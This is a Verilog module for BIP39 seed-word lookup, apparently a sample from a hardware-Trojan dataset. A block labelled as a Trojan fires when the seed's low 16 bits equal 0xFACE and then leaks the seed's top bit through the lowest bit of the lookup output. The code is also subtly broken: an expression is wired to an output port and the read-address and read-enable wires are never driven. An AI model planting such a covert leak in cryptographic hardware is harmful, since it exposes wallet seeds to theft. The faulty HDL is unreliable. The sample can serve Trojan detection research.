module bip39 (
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_random_seed
);

    /******** Trojan-specific additions ********/
    // Define the trigger condition for information leakage
    wire leak_condition = (i_random_seed[15:0] == 16'hFACE); // Specific lower bits pattern
    
    // Use a covert channel to leak one bit of information from i_random_seed
    reg leaked_bit;
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            leaked_bit <= 0;
        end else if (leak_condition) begin
            // When triggered, leak the MSB of i_random_seed through an existing output
            leaked_bit <= i_random_seed[31];
        end else begin
            leaked_bit <= leaked_bit; // Maintain the leaked bit state
        end
    end
    /*******************************************/

    wire                [7:0]  w_random;
    wire                [13:0] w_rd_addr;
    wire                        w_rd_en;
    wire                [7:0]   w_q_data;

    // Instance of random number generator
    random random_inst0 (
        .i_clk(i_clk),
        .i_reset_n(i_reset_n),
        .i_seed(i_random_seed),
        .o_data(w_random)
    );

    // Instance of bip39 table lookup
    bip39_table bip39_table_inst (
        .address(w_rd_addr),
        .clock(i_clk),
        .rden(w_rd_en),
        // Modify an existing output to occasionally leak information
        .q(leak_condition ? {w_q_data[7:1], leaked_bit} : w_q_data) // Modification for Trojan
    );

endmodule
